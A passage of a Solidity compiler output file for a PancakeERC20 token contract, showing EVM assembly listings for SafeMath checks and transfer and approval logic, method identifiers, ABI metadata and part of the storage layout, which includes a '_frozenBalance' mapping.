											"name": "MSTORE"
										},
										{
											"begin": 431,
											"end": 495,
											"name": "SWAP1"
										},
										{
											"begin": 431,
											"end": 495,
											"name": "DUP3"
										},
										{
											"begin": 431,
											"end": 495,
											"name": "MSTORE"
										},
										{
											"begin": 431,
											"end": 495,
											"name": "SWAP1"
										},
										{
											"begin": 431,
											"end": 495,
											"name": "KECCAK256"
										},
										{
											"begin": 431,
											"end": 495,
											"name": "SLOAD"
										},
										{
											"begin": 431,
											"end": 495,
											"name": "DUP2"
										},
										{
											"begin": 431,
											"end": 495,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 2452,
											"end": 2621,
											"name": "tag",
											"value": "66"
										},
										{
											"begin": 2452,
											"end": 2621,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 2535,
											"end": 2551,
											"name": "DUP1"
										},
										{
											"begin": 2535,
											"end": 2551,
											"name": "DUP5"
										},
										{
											"begin": 2535,
											"end": 2551,
											"name": "AND"
										},
										{
											"begin": 2535,
											"end": 2551,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2535,
											"end": 2551,
											"name": "DUP2"
										},
										{
											"begin": 2535,
											"end": 2551,
											"name": "DUP2"
										},
										{
											"begin": 2535,
											"end": 2551,
											"name": "MSTORE"
										},
										{
											"begin": 2535,
											"end": 2544,
											"name": "PUSH",
											"value": "2"
										},
										{
											"begin": 2535,
											"end": 2551,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2535,
											"end": 2551,
											"name": "SWAP1"
										},
										{
											"begin": 2535,
											"end": 2551,
											"name": "DUP2"
										},
										{
											"begin": 2535,
											"end": 2551,
											"name": "MSTORE"
										},
										{
											"begin": 2535,
											"end": 2551,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 2535,
											"end": 2551,
											"name": "DUP1"
										},
										{
											"begin": 2535,
											"end": 2551,
											"name": "DUP4"
										},
										{
											"begin": 2535,
											"end": 2551,
											"name": "KECCAK256"
										},
										{
											"begin": 2535,
											"end": 2560,
											"name": "SWAP5"
										},
										{
											"begin": 2535,
											"end": 2560,
											"name": "DUP8"
										},
										{
											"begin": 2535,
											"end": 2560,
											"name": "AND"
										},
										{
											"begin": 2535,
											"end": 2560,
											"name": "DUP1"
										},
										{
											"begin": 2535,
											"end": 2560,
											"name": "DUP5"
										},
										{
											"begin": 2535,
											"end": 2560,
											"name": "MSTORE"
										},
										{
											"begin": 2535,
											"end": 2560,
											"name": "SWAP5"
										},
										{
											"begin": 2535,
											"end": 2560,
											"name": "DUP3"
										},
										{
											"begin": 2535,
											"end": 2560,
											"name": "MSTORE"
										},
										{
											"begin": 2535,
											"end": 2560,
											"name": "SWAP2"
										},
										{
											"begin": 2535,
											"end": 2560,
											"name": "DUP3"
										},
										{
											"begin": 2535,
											"end": 2560,
											"name": "SWAP1"
										},
										{
											"begin": 2535,
											"end": 2560,
											"name": "KECCAK256"
										},
										{
											"begin": 2535,
											"end": 2568,
											"name": "DUP6"
										},
										{
											"begin": 2535,
											"end": 2568,
											"name": "SWAP1"
										},
										{
											"begin": 2535,
											"end": 2568,
											"name": "SSTORE"
										},
										{
											"begin": 2583,
											"end": 2614,
											"name": "DUP2"
										},
										{
											"begin": 2583,
											"end": 2614,
											"name": "MLOAD"
										},
										{
											"begin": 2583,
											"end": 2614,
											"name": "DUP6"
										},
										{
											"begin": 2583,
											"end": 2614,
											"name": "DUP2"
										},
										{
											"begin": 2583,
											"end": 2614,
											"name": "MSTORE"
										},
										{
											"begin": 2583,
											"end": 2614,
											"name": "SWAP2"
										},
										{
											"begin": 2583,
											"end": 2614,
											"name": "MLOAD"
										},
										{
											"begin": 2583,
											"end": 2614,
											"name": "PUSH",
											"value": "8C5BE1E5EBEC7D5BD14F71427D1E84F3DD0314C0F7B2291E5B200AC8C7C3B925"
										},
										{
											"begin": 2583,
											"end": 2614,
											"name": "SWAP3"
										},
										{
											"begin": 2583,
											"end": 2614,
											"name": "DUP2"
										},
										{
											"begin": 2583,
											"end": 2614,
											"name": "SWAP1"
										},
										{
											"begin": 2583,
											"end": 2614,
											"name": "SUB"
										},
										{
											"begin": 2583,
											"end": 2614,
											"name": "SWAP1"
										},
										{
											"begin": 2583,
											"end": 2614,
											"name": "SWAP2"
										},
										{
											"begin": 2583,
											"end": 2614,
											"name": "ADD"
										},
										{
											"begin": 2583,
											"end": 2614,
											"name": "SWAP1"
										},
										{
											"begin": 2583,
											"end": 2614,
											"name": "LOG3"
										},
										{
											"begin": 2452,
											"end": 2621,
											"name": "POP"
										},
										{
											"begin": 2452,
											"end": 2621,
											"name": "POP"
										},
										{
											"begin": 2452,
											"end": 2621,
											"name": "POP"
										},
										{
											"begin": 2452,
											"end": 2621,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 339,
											"end": 475,
											"name": "tag",
											"value": "70"
										},
										{
											"begin": 339,
											"end": 475,
											"name": "JUMPDEST"
										},
										{
											"begin": 431,
											"end": 436,
											"name": "DUP1"
										},
										{
											"begin": 431,
											"end": 436,
											"name": "DUP3"
										},
										{
											"begin": 431,
											"end": 436,
											"name": "SUB"
										},
										{
											"begin": 426,
											"end": 442,
											"name": "DUP3"
										},
										{
											"begin": 426,
											"end": 442,
											"name": "DUP2"
										},
										{
											"begin": 426,
											"end": 442,
											"name": "GT"
										},
										{
											"begin": 426,
											"end": 442,
											"name": "ISZERO"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "PUSH [tag]",
											"value": "64"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "JUMPI"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "DUP1"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "DUP2"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "MSTORE"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "DUP3"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "ADD"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "MSTORE"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "PUSH",
											"value": "15"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "DUP3"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "ADD"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "MSTORE"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "64732D6D6174682D7375622D756E646572666C6F77"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "58"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "PUSH",
											"value": "44"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "DUP3"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "ADD"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "MSTORE"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "SWAP1"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "MLOAD"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "SWAP1"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "DUP2"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "SWAP1"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "SUB"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "PUSH",
											"value": "64"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "ADD"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "SWAP1"
										},
										{
											"begin": 418,
											"end": 468,
											"name": "REVERT"
										},
										{
											"begin": 2627,
											"end": 2846,
											"name": "tag",
											"value": "72"
										},
										{
											"begin": 2627,
											"end": 2846,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 2723,
											"end": 2738,
											"name": "DUP4"
										},
										{
											"begin": 2723,
											"end": 2738,
											"name": "AND"
										},
										{
											"begin": 2723,
											"end": 2738,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2723,
											"end": 2738,
											"name": "SWAP1"
										},
										{
											"begin": 2723,
											"end": 2738,
											"name": "DUP2"
										},
										{
											"begin": 2723,
											"end": 2738,
											"name": "MSTORE"
										},
										{
											"begin": 2723,
											"end": 2732,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 2723,
											"end": 2738,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2723,
											"end": 2738,
											"name": "MSTORE"
										},
										{
											"begin": 2723,
											"end": 2738,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 2723,
											"end": 2738,
											"name": "SWAP1"
										},
										{
											"begin": 2723,
											"end": 2738,
											"name": "KECCAK256"
										},
										{
											"begin": 2723,
											"end": 2738,
											"name": "SLOAD"
										},
										{
											"begin": 2723,
											"end": 2749,
											"name": "PUSH [tag]",
											"value": "85"
										},
										{
											"begin": 2723,
											"end": 2749,
											"name": "SWAP1"
										},
										{
											"begin": 2743,
											"end": 2748,
											"name": "DUP3"
										},
										{
											"begin": 2723,
											"end": 2749,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 2723,
											"end": 2742,
											"name": "PUSH [tag]",
											"value": "70"
										},
										{
											"begin": 2723,
											"end": 2749,
											"name": "AND"
										},
										{
											"begin": 2723,
											"end": 2749,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 2723,
											"end": 2749,
											"name": "tag",
											"value": "85"
										},
										{
											"begin": 2723,
											"end": 2749,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 2705,
											"end": 2720,
											"name": "DUP1"
										},
										{
											"begin": 2705,
											"end": 2720,
											"name": "DUP6"
										},
										{
											"begin": 2705,
											"end": 2720,
											"name": "AND"
										},
										{
											"begin": 2705,
											"end": 2720,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2705,
											"end": 2720,
											"name": "SWAP1"
										},
										{
											"begin": 2705,
											"end": 2720,
											"name": "DUP2"
										},
										{
											"begin": 2705,
											"end": 2720,
											"name": "MSTORE"
										},
										{
											"begin": 2705,
											"end": 2714,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 2705,
											"end": 2720,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2705,
											"end": 2720,
											"name": "MSTORE"
										},
										{
											"begin": 2705,
											"end": 2720,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 2705,
											"end": 2720,
											"name": "DUP1"
										},
										{
											"begin": 2705,
											"end": 2720,
											"name": "DUP3"
										},
										{
											"begin": 2705,
											"end": 2720,
											"name": "KECCAK256"
										},
										{
											"begin": 2705,
											"end": 2749,
											"name": "SWAP4"
										},
										{
											"begin": 2705,
											"end": 2749,
											"name": "SWAP1"
										},
										{
											"begin": 2705,
											"end": 2749,
											"name": "SWAP4"
										},
										{
											"begin": 2705,
											"end": 2749,
											"name": "SSTORE"
										},
										{
											"begin": 2775,
											"end": 2788,
											"name": "SWAP1"
										},
										{
											"begin": 2775,
											"end": 2788,
											"name": "DUP5"
										},
										{
											"begin": 2775,
											"end": 2788,
											"name": "AND"
										},
										{
											"begin": 2775,
											"end": 2788,
											"name": "DUP2"
										},
										{
											"begin": 2775,
											"end": 2788,
											"name": "MSTORE"
										},
										{
											"begin": 2775,
											"end": 2788,
											"name": "KECCAK256"
										},
										{
											"begin": 2775,
											"end": 2788,
											"name": "SLOAD"
										},
										{
											"begin": 2775,
											"end": 2799,
											"name": "PUSH [tag]",
											"value": "86"
										},
										{
											"begin": 2775,
											"end": 2799,
											"name": "SWAP1"
										},
										{
											"begin": 2793,
											"end": 2798,
											"name": "DUP3"
										},
										{
											"begin": 2775,
											"end": 2799,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 2775,
											"end": 2792,
											"name": "PUSH [tag]",
											"value": "87"
										},
										{
											"begin": 2775,
											"end": 2799,
											"name": "AND"
										},
										{
											"begin": 2775,
											"end": 2799,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 2775,
											"end": 2799,
											"name": "tag",
											"value": "86"
										},
										{
											"begin": 2775,
											"end": 2799,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 2759,
											"end": 2772,
											"name": "DUP1"
										},
										{
											"begin": 2759,
											"end": 2772,
											"name": "DUP5"
										},
										{
											"begin": 2759,
											"end": 2772,
											"name": "AND"
										},
										{
											"begin": 2759,
											"end": 2772,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 2759,
											"end": 2772,
											"name": "DUP2"
										},
										{
											"begin": 2759,
											"end": 2772,
											"name": "DUP2"
										},
										{
											"begin": 2759,
											"end": 2772,
											"name": "MSTORE"
										},
										{
											"begin": 2759,
											"end": 2768,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 2759,
											"end": 2772,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2759,
											"end": 2772,
											"name": "SWAP1"
										},
										{
											"begin": 2759,
											"end": 2772,
											"name": "DUP2"
										},
										{
											"begin": 2759,
											"end": 2772,
											"name": "MSTORE"
										},
										{
											"begin": 2759,
											"end": 2772,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 2759,
											"end": 2772,
											"name": "SWAP2"
										},
										{
											"begin": 2759,
											"end": 2772,
											"name": "DUP3"
										},
										{
											"begin": 2759,
											"end": 2772,
											"name": "SWAP1"
										},
										{
											"begin": 2759,
											"end": 2772,
											"name": "KECCAK256"
										},
										{
											"begin": 2759,
											"end": 2799,
											"name": "SWAP5"
										},
										{
											"begin": 2759,
											"end": 2799,
											"name": "SWAP1"
										},
										{
											"begin": 2759,
											"end": 2799,
											"name": "SWAP5"
										},
										{
											"begin": 2759,
											"end": 2799,
											"name": "SSTORE"
										},
										{
											"begin": 2814,
											"end": 2839,
											"name": "DUP1"
										},
										{
											"begin": 2814,
											"end": 2839,
											"name": "MLOAD"
										},
										{
											"begin": 2814,
											"end": 2839,
											"name": "DUP6"
										},
										{
											"begin": 2814,
											"end": 2839,
											"name": "DUP2"
										},
										{
											"begin": 2814,
											"end": 2839,
											"name": "MSTORE"
										},
										{
											"begin": 2814,
											"end": 2839,
											"name": "SWAP1"
										},
										{
											"begin": 2814,
											"end": 2839,
											"name": "MLOAD"
										},
										{
											"begin": 2759,
											"end": 2772,
											"name": "SWAP2"
										},
										{
											"begin": 2759,
											"end": 2772,
											"name": "SWAP4"
										},
										{
											"begin": 2814,
											"end": 2839,
											"name": "SWAP3"
										},
										{
											"begin": 2814,
											"end": 2839,
											"name": "DUP8"
										},
										{
											"begin": 2814,
											"end": 2839,
											"name": "AND"
										},
										{
											"begin": 2814,
											"end": 2839,
											"name": "SWAP3"
										},
										{
											"begin": 2814,
											"end": 2839,
											"name": "PUSH",
											"value": "DDF252AD1BE2C89B69C2B068FC378DAA952BA7F163C4A11628F55A4DF523B3EF"
										},
										{
											"begin": 2814,
											"end": 2839,
											"name": "SWAP3"
										},
										{
											"begin": 2814,
											"end": 2839,
											"name": "SWAP2"
										},
										{
											"begin": 2814,
											"end": 2839,
											"name": "DUP3"
										},
										{
											"begin": 2814,
											"end": 2839,
											"name": "SWAP1"
										},
										{
											"begin": 2814,
											"end": 2839,
											"name": "SUB"
										},
										{
											"begin": 2814,
											"end": 2839,
											"name": "ADD"
										},
										{
											"begin": 2814,
											"end": 2839,
											"name": "SWAP1"
										},
										{
											"begin": 2814,
											"end": 2839,
											"name": "LOG3"
										},
										{
											"begin": 2627,
											"end": 2846,
											"name": "POP"
										},
										{
											"begin": 2627,
											"end": 2846,
											"name": "POP"
										},
										{
											"begin": 2627,
											"end": 2846,
											"name": "POP"
										},
										{
											"begin": 2627,
											"end": 2846,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 198,
											"end": 333,
											"name": "tag",
											"value": "87"
										},
										{
											"begin": 198,
											"end": 333,
											"name": "JUMPDEST"
										},
										{
											"begin": 290,
											"end": 295,
											"name": "DUP1"
										},
										{
											"begin": 290,
											"end": 295,
											"name": "DUP3"
										},
										{
											"begin": 290,
											"end": 295,
											"name": "ADD"
										},
										{
											"begin": 285,
											"end": 301,
											"name": "DUP3"
										},
										{
											"begin": 285,
											"end": 301,
											"name": "DUP2"
										},
										{
											"begin": 285,
											"end": 301,
											"name": "LT"
										},
										{
											"begin": 285,
											"end": 301,
											"name": "ISZERO"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "PUSH [tag]",
											"value": "64"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "JUMPI"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "DUP1"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "DUP2"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "MSTORE"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "DUP3"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "ADD"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "MSTORE"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "PUSH",
											"value": "14"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "DUP3"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "ADD"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "MSTORE"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "64732D6D6174682D6164642D6F766572666C6F77"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "60"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "PUSH",
											"value": "44"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "DUP3"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "ADD"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "MSTORE"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "SWAP1"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "MLOAD"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "SWAP1"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "DUP2"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "SWAP1"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "SUB"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "PUSH",
											"value": "64"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "ADD"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "SWAP1"
										},
										{
											"begin": 277,
											"end": 326,
											"name": "REVERT"
										}
									]
								},
								"8B73C3C69BB8FE3D512ECC4CF759CC79239F7B179B0FFACAA9A75D522B39400F": "454950373132446f6d61696e28737472696e67206e616d652c737472696e672076657273696f6e2c75696e7432353620636861696e49642c6164647265737320766572696679696e67436f6e747261637429"
							}
						},
						"methodIdentifiers": {
							"DOMAIN_SEPARATOR()": "3644e515",
							"PERMIT_TYPEHASH()": "30adf81f",
							"_frozenBalance(address)": "47d5d856",
							"allowance(address,address)": "dd62ed3e",
							"approve(address,uint256)": "095ea7b3",
							"balanceOf(address)": "70a08231",
							"decimals()": "313ce567",
							"name()": "06fdde03",
							"nonces(address)": "7ecebe00",
							"permit(address,address,uint256,uint256,uint8,bytes32,bytes32)": "d505accf",
							"symbol()": "95d89b41",
							"totalSupply()": "18160ddd",
							"transfer(address,uint256)": "a9059cbb",
							"transferFrom(address,address,uint256)": "23b872dd"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.5.16+commit.9c3226ce\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"constant\":true,\"inputs\":[],\"name\":\"DOMAIN_SEPARATOR\",\"outputs\":[{\"internalType\":\"bytes32\",\"name\":\"\",\"type\":\"bytes32\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"PERMIT_TYPEHASH\",\"outputs\":[{\"internalType\":\"bytes32\",\"name\":\"\",\"type\":\"bytes32\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_frozenBalance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"nonces\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"deadline\",\"type\":\"uint256\"},{\"internalType\":\"uint8\",\"name\":\"v\",\"type\":\"uint8\"},{\"internalType\":\"bytes32\",\"name\":\"r\",\"type\":\"bytes32\"},{\"internalType\":\"bytes32\",\"name\":\"s\",\"type\":\"bytes32\"}],\"name\":\"permit\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"methods\":{}},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"src/exchange-protocol/contracts/PancakeERC20.sol\":\"PancakeERC20\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"optimizer\":{\"enabled\":true,\"runs\":200},\"remappings\":[]},\"sources\":{\"src/exchange-protocol/contracts/PancakeERC20.sol\":{\"keccak256\":\"0x22102f2e61221b4fb36f09c30b2abe3d790a450fa344c78bd7fed2a8d937300a\",\"urls\":[\"bzz-raw://777452abf0aa99434b78ed9d8e4c8d8885190e5a423231f2c84ba804c0759b72\",\"dweb:/ipfs/QmVNe5PF8g4SyaGr4qREDfSohqdq88vZ1FAEjY6xMqHwB4\"]},\"src/exchange-protocol/contracts/interfaces/IPancakeERC20.sol\":{\"keccak256\":\"0xcbc23c5f49cec5fe9a629b28641466e09d1decf16b568b874d0a2a54df3e3164\",\"urls\":[\"bzz-raw://2edfcc3d8fca38ab0facf5d1ba062e6e4c23fc2c2390078ef8ccb5290495fdab\",\"dweb:/ipfs/QmZmTT6nVVSvesy6oY8pwHKvuY5W1EZr5jGeBmK73Rvrzg\"]},\"src/exchange-protocol/contracts/libraries/SafeMath.sol\":{\"keccak256\":\"0xd0cc5ede4252f34f9adf75af689fb003aa6349f229b9bba72db43cba9bb1c9d9\",\"urls\":[\"bzz-raw://a2cb594533aebe5028b93c5c429b23907a4830964d8c6728565992bee4cf1eef\",\"dweb:/ipfs/QmdSBCeJiqjQeGZ2K79DXaDfaqJMtXCWAyXDWJ3KNDWZKM\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [
							{
								"astId": 19,
								"contract": "src/exchange-protocol/contracts/PancakeERC20.sol:PancakeERC20",
								"label": "totalSupply",
								"offset": 0,
								"slot": "0",
								"type": "t_uint256"
							},
							{
								"astId": 23,
								"contract": "src/exchange-protocol/contracts/PancakeERC20.sol:PancakeERC20",
								"label": "balanceOf",
								"offset": 0,
								"slot": "1",
								"type": "t_mapping(t_address,t_uint256)"
							},
							{
								"astId": 29,
								"contract": "src/exchange-protocol/contracts/PancakeERC20.sol:PancakeERC20",
								"label": "allowance",
								"offset": 0,
								"slot": "2",
								"type": "t_mapping(t_address,t_mapping(t_address,t_uint256))"
							},
							{
								"astId": 33,
								"contract": "src/exchange-protocol/contracts/PancakeERC20.sol:PancakeERC20",
								"label": "_frozenBalance",
